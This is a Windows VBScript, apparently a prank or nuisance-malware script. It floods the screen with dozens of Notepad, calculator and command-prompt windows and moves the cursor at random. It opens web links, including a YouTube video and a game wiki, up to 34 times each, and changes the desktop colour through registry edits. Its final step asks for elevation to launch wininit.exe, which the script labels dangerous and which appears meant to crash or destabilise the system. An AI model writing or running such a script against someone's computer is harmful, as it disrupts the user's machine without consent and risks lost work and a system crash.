Dim objShell
Set objShell = CreateObject("WScript.Shell")

' === Magnify the screen ===
objShell.Run "magnify.exe"

' === Move the cursor randomly ===
Dim x, y
Randomize ' Initialize random seed

For i = 1 To 100
    x = Int(Rnd * 1000)
    y = Int(Rnd * 800)
    ' Move mouse using PowerShell since VBScript can't set cursor directly
    objShell.Run "powershell.exe -Command ""[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(" & x & "," & y & ")"""
    WScript.Sleep 100
Next

' === Open 50 Notepads ===
For i = 1 To 50
    objShell.Run "notepad.exe"
    WScript.Sleep 100
Next

' === Open first link ===
objShell.Run """https://culurbug.carrd.co"""

' === Change background to purple using registry + refresh ===
objShell.Run "powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Control Panel\Colors' -Name Background -Value '128 0 128'; rundll32.exe user32.dll,UpdatePerUserSystemParameters"""

' === Open calculator 5 times ===
For i = 1 To 5
    objShell.Run "calc.exe"
Next

' === Open cmd 8 times ===
For i = 1 To 8
    objShell.Run "cmd.exe"
Next

' === Change background to black ===
objShell.Run "powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Control Panel\Colors' -Name Background -Value '0 0 0'; rundll32.exe user32.dll,UpdatePerUserSystemParameters"""

' === Open YouTube 20 times ===
For i = 1 To 20
    objShell.Run """https://www.youtube.com/watch?v=QRbMnlncGkQ"""
Next

' === Open Doors Codes wiki 34 times ===
For i = 1 To 34
    objShell.Run """https://doors-game.fandom.com/wiki/Codes"""
Next

' === Open screenshare 2 times ===
For i = 1 To 2
    objShell.Run """https://screenshare.pics/P1715Q"""
Next

' === Run PowerShell as admin and execute wininit (⚠️ Dangerous, be careful) ===
objShell.Run "powershell.exe -Command ""Start-Process powershell -Verb runAs -ArgumentList 'Start-Process wininit.exe'"""
